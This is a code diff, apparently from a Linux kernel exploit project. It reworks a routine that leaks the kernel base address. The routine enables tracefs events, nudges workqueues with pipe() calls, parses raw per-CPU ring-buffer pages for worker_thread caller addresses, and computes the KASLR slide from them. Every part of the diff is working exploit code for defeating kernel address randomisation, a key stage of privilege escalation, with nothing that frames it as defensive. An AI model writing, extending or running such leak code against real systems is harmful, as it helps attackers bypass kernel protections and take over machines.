@@ -16,8 +16,54 @@ static int slide_tracefs_write(const char *path, const char *value) {
   return wrote == (ssize_t)len;
 }
 
-static int slide_tracefs_parse_page(
-    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
+#ifndef SLIDE_MAX_OFFSET
+#define SLIDE_MAX_OFFSET 0x1f0000ULL
+#endif
+#ifndef SLIDE_ALIGN_MASK
+#define SLIDE_ALIGN_MASK 0xffffULL
+#endif
+
+static int slide_caller_to_candidate(uint64_t caller, uintptr_t *candidate_out) {
+  if (caller < KIMAGE_TEXT_BASE) {
+    return 0;
+  }
+
+  uint64_t delta = caller - KIMAGE_TEXT_BASE;
+
+  /* Preferred: exact return site after worker_thread's blocking BL schedule. */
+  if (delta >= SLIDE_TRACEFS_WORKER_CALLER_OFF) {
+    uint64_t exact = delta - SLIDE_TRACEFS_WORKER_CALLER_OFF;
+    if (exact <= SLIDE_MAX_OFFSET && (exact & SLIDE_ALIGN_MASK) == 0) {
+      pr_success("slide tracefs caller=%016llx candidate=%08llx via=exact\n",
+                 (unsigned long long)caller, (unsigned long long)exact);
+      *candidate_out = (uintptr_t)exact;
+      return 1;
+    }
+  }
+
+#if defined(SLIDE_WORKER_THREAD_OFF) && defined(SLIDE_WORKER_THREAD_SIZE)
+  /* Accept a target-defined PC elsewhere inside worker_thread. */
+  if (delta >= SLIDE_WORKER_THREAD_OFF) {
+    uint64_t maybe = delta - SLIDE_WORKER_THREAD_OFF;
+    uint64_t off_in_fn = maybe & SLIDE_ALIGN_MASK;
+    uint64_t slide = maybe & ~SLIDE_ALIGN_MASK;
+    if (off_in_fn < SLIDE_WORKER_THREAD_SIZE && slide <= SLIDE_MAX_OFFSET) {
+      pr_success("slide tracefs caller=%016llx candidate=%08llx via=worker "
+                 "off_in_fn=%04llx\n",
+                 (unsigned long long)caller, (unsigned long long)slide,
+                 (unsigned long long)off_in_fn);
+      *candidate_out = (uintptr_t)slide;
+      return 1;
+    }
+  }
+#endif
+
+  return 0;
+}
+
+static int slide_tracefs_parse_page(const unsigned char *page, size_t page_len,
+                                    uintptr_t *candidate_out, int *seen_id_out,
+                                    int *seen_any_out) {
   if (page_len < 20) {
     return 0;
   }
@@ -53,19 +99,33 @@ static int slide_tracefs_parse_page(
     }
     uint16_t event_id = 0;
     memcpy(&event_id, page + record, sizeof(event_id));
-    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
-      uint64_t caller = 0;
-      memcpy(&caller, page + record + 16, sizeof(caller));
-      uint64_t link_caller =
-          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
-      if (caller >= link_caller) {
-        uint64_t candidate = caller - link_caller;
-        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
-          pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
-                     (unsigned long long)caller,
-                     (unsigned long long)candidate);
-          *candidate_out = (uintptr_t)candidate;
+    if (seen_any_out) {
+      (*seen_any_out)++;
+    }
+    if (event_id == SLIDE_TRACEFS_EVENT_ID) {
+      if (seen_id_out) {
+        (*seen_id_out)++;
+      }
+      if (record_len >= 24) {
+        uint64_t caller = 0;
+        memcpy(&caller, page + record + 16, sizeof(caller));
+        if (slide_caller_to_candidate(caller, candidate_out)) {
           return 1;
+        }
+        /* Log a few unique misses only — full spam fills multi‑MB logs. */
+        static uint64_t miss_seen[8];
+        static int miss_n;
+        int dup = 0;
+        for (int i = 0; i < miss_n; i++) {
+          if (miss_seen[i] == caller) {
+            dup = 1;
+            break;
+          }
+        }
+        if (!dup && miss_n < 8) {
+          miss_seen[miss_n++] = caller;
+          pr_info("slide tracefs id=%u caller=%016llx (no slide match)\n",
+                  (unsigned)event_id, (unsigned long long)caller);
         }
       }
     }
@@ -93,12 +153,25 @@ static int slide_tracefs_leak_kernel_base(void) {
   if (trace_fd >= 0) {
     close(trace_fd);
   }
-  sleep(1);
+  /* Give the ring buffer time to collect blocked kworkers. */
+  sleep(3);
+  /* Nudge workqueues so worker_thread hits schedule. */
+  for (int i = 0; i < 32; i++) {
+    int p[2];
+    if (pipe(p) == 0) {
+      close(p[0]);
+      close(p[1]);
+    }
+  }
+  usleep(200000);
   slide_tracefs_write(tracing_on, "0");
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   uintptr_t candidate = 0;
   int found = 0;
+  int seen_id = 0;
+  int seen_any = 0;
+  int opened = 0;
   for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
     char path[128];
     snprintf(path, sizeof(path),
@@ -107,10 +180,12 @@ static int slide_tracefs_leak_kernel_base(void) {
     if (fd < 0) {
       continue;
     }
+    opened++;
     unsigned char page[4096];
     ssize_t got;
     while ((got = read(fd, page, sizeof(page))) > 0) {
-      if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
+      if (slide_tracefs_parse_page(page, (size_t)got, &candidate, &seen_id,
+                                   &seen_any)) {
         found = 1;
         break;
       }
@@ -119,7 +194,9 @@ static int slide_tracefs_leak_kernel_base(void) {
   }
   slide_tracefs_write(event_enable, "0");
   if (!found) {
-    pr_error("slide tracefs worker caller not found\n");
+    pr_error("slide tracefs worker caller not found "
+             "(cpus_open=%d records=%d id_%u=%d)\n",
+             opened, seen_any, (unsigned)SLIDE_TRACEFS_EVENT_ID, seen_id);
     return 0;
   }
 
@@ -140,8 +217,8 @@ int slide_leak_kernel_base(void) {
     char *end = NULL;
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
-    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
-        (value & 0xffffULL) != 0) {
+    if (errno || end == forced_offset_arg || *end ||
+        value > SLIDE_MAX_OFFSET || (value & SLIDE_ALIGN_MASK) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
